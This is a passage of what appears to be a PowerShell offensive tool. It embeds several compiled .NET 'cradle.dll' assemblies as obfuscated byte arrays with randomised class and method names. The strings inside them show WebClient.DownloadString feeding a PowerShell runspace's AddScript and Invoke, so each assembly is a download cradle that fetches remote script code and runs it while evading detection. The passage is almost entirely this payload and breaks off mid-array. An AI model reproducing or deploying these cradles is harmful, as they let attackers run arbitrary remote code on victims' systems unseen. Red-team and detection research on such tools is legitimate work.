0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(232,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,64,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,204,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,172,3,0,0,8,0,0,0,35,85,83,0,180,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,196,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,41,0,34,0,6,0,124,0,92,0,6,0,156,0,92,0,10,0,5,1,222,0,10,0,21,1,222,0,10,0,50,1,193,0,14,0,92,1,81,1,6,0,117,1,34,0,6,0,172,1,141,1,10,0,185,1,193,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,48,0,10,0,1,0,157,32,0,0,0,0,134,24,64,0,16,0,3,0,0,0,1,0,70,0,0,0,2,0,74,0,17,0,64,0,20,0,25,0,64,0,16,0,33,0,30,1,34,0,41,0,45,1,16,0,49,0,61,1,39,0,49,0,68,1,44,0,57,0,64,0,16,0,57,0,102,1,50,0,65,0,124,1,55,0,49,0,131,1,62,0,49,0,194,1,68,0,9,0,64,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(186,0,0,0,4)+@(0)*11+@(1,0,25,0,0,0,0,0,3)+@(0)*11+@(25,0,193,0,0,0,0,0,4)+@(0)*11+@(1,0,34)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,88,77,49,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,82,101,102,101,114,101,110,99,101,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,59,0,0,0,0,0,98,234,94,199,177,106,155,66,149,172,188,153,129,254,77,12,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,16,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))

    $LegitSoundingClassAndMethodCompiledRandom   =   @()
    $LegitSoundingClassAndMethodCompiledRandom  += , @('jkPHT'         , 'vgIcr'             , @("$CompiledHeader`107,53,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,94,0,62,0,6,0,126,0,62,0,10,0,178,0,167,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,56,0,15,0,2,0,0,0,1,0,163,0,17,0,56,0,19,0,25,0,56,0,15,0,33,0,56,0,15,0,33,0,188,0,24,0,9,0,56,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(156,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,106,107,80,72,84,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,118,103,73,99,114,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,3,32,0,0,0,0,0,68,218,56,157,113,251,252,66,148,77,180,138,165,71,119,81,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*155+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502","$CompiledHeader`117,53,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(156,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,0,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,164,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,116,3,0,0,8,0,0,0,35,85,83,0,124,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,140,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,98,0,66,0,6,0,130,0,66,0,10,0,235,0,196,0,10,0,251,0,196,0,10,0,24,1,167,0,14,0,66,1,55,1,6,0,132,1,101,1,10,0,145,1,167,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,146,32,0,0,0,0,134,24,56,0,15,0,2,0,0,0,1,0,62,0,17,0,56,0,19,0,25,0,56,0,15,0,33,0,4,1,33,0,41,0,19,1,15,0,49,0,35,1,38,0,49,0,42,1,43,0,57,0,56,0,15,0,57,0,76,1,49,0,49,0,91,1,54,0,49,0,154,1,60,0,9,0,56,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(160,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(24,0,167,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,106,107,80,72,84,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,118,103,73,99,114,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,32,0,0,0,0,0,159,211,65,224,105,66,27,72,158,140,20,154,185,68,52,158,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,196,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`132,53,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(224,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,56,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,196,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,164,3,0,0,8,0,0,0,35,85,83,0,172,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,188,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,116,0,84,0,6,0,148,0,84,0,10,0,253,0,214,0,10,0,13,1,214,0,10,0,42,1,185,0,14,0,84,1,73,1,6,0,109,1,36,0,6,0,164,1,133,1,10,0,177,1,185,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,157,32,0,0,0,0,134,24,56,0,16,0,3,0,0,0,1,0,62,0,0,0,2,0,66,0,17,0,56,0,20,0,25,0,56,0,16,0,33,0,22,1,34,0,41,0,37,1,16,0,49,0,53,1,39,0,49,0,60,1,44,0,57,0,56,0,16,0,57,0,94,1,50,0,65,0,116,1,55,0,49,0,123,1,62,0,49,0,186,1,68,0,9,0,56,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(178,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(25,0,185,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,106,107,80,72,84,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,118,103,73,99,114,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,59,0,0,0,0,0,228,34,83,36,233,160,223,71,159,158,143,23,4,242,197,65,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,8,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,